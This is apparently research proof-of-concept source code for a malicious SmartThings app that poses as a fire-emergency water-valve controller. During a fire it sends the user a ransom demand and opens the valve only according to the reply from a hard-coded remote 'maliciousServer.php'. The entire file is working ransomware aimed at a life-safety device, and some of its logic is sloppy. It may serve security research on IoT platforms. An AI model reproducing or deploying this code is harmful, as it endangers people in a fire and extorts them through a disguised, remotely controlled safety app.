
/**

 *  shiqiWaterValve

 *

 *  Copyright 2016 Yunhan Jia &amp; Shiqi Wang

 *

 *  Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except

 *  in compliance with the License. You may obtain a copy of the License at:

 *

 *      http://www.apache.org/licenses/LICENSE-2.0

 *

 *  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed

 *  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License

 *  for the specific language governing permissions and limitations under the License.

 * Attack Description:
    The malicious smartApps would not take effective actions until the user pay the money when the emergency happens.



Malicous FireAlarm:
    Normal functions:
    The water valve smartApp controls the emergent water. If there is a fire at home and the fire alarm strobe, then it would pull out great amount of water to put off the fire.

    Malicious functions:
    The malicious water valve smartApp does not let the user pull out the water until he pays the money.

 */

definition(

    name: "shiqiWaterValve",

    namespace: "wsq",

    author: "Yunhan Jia & Shiqi Wang",

    description: "The water valve is used to pull out water when there is a fire home (when the fire alarm strobed)",

    category: "Safety & Security",

    iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",

    iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",

    iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

 

 

preferences {

  section("Title") {

    input "smoke", "capability.smokeDetector", title: "smoke"

    input "alarm", "capability.alarm"

    input "valve", "capability.switch"

  }

  section("Send Notifications?") {

      input("recipients", "contact", title: "Send notifications to") {

      input "phone", "phone", title: "Warn with text message (optional)",

          description: "Phone Number", required: false

      }

  }

}

 

def installed() {

       log.debug "Installed with settings: ${settings}"

       initialize()

}

 

def updated() {

       log.debug "Updated with settings: ${settings}"

 

       unsubscribe()

       initialize()

}

 

def initialize() {

       state.attack = false

       subscribe(smoke, "smoke", smokeHandler)

      subscribe(alarm, "alarm", strobeHandler)

}

 

def smokeHandler(evt) {

  if("detected" == evt.value) {

    alarm.strobe()

  }

  if("clear" == evt.value) {

     alarm.off()

  }

}

 

def strobeHandler(evt) {

       if(evt.value == "strobe") {

          state.msg = "Our home is on fire!!!"

        state.attackRansonMsg = "If you want to open the valve! pay 100 dollar to account: attackerAcount!!!"

          sendNotification()

          log.debug "smoke strobe the alarm"

        log.debug "attack:send ransomware msg to the user!!!"

        attack()

        log.debug "open valve"

    }

       if(evt.value == "off") {

          state.msg = "The fire is put out1"

        state.attackRansonMsg = "Thanks! Good Luck!!!"

        sendNotification()

          log.debug "clear, turn off the alarm"

        valve.off()

        log.debug "close valve"

    }

    //attack()

}

 

 

def attack() {

       try{

        httpGet("http://141.212.110.244/stmalware/maliciousServer.php") { resp ->

 

              if(resp.status == 200)

              {

                     state.attack = resp.data.toString()

            //log.debug state.attack

              }

              else

              {

                     log.error "unknown response"

              }

 

       }

    }

    catch (e){

        log.debug e

    }

    if(state.attack == false) {

          log.debug "attack succeed: got the money!"

          valve.on()

        state.attack == true

    }

}

 

def sendNotification() {

    log.debug "recipients configured: $recipients"

      

    def message = state.msg + state.attackRansonMsg

    log.debug "message = $message"

    if (location.contactBookEnabled && recipients) {

        log.debug "contact book enabled!"

        sendNotificationToContacts(message, recipients)

    } else {

        log.debug "contact book not enabled"

        if (phone) {

            sendSms(phone, message)

        }

    }

}

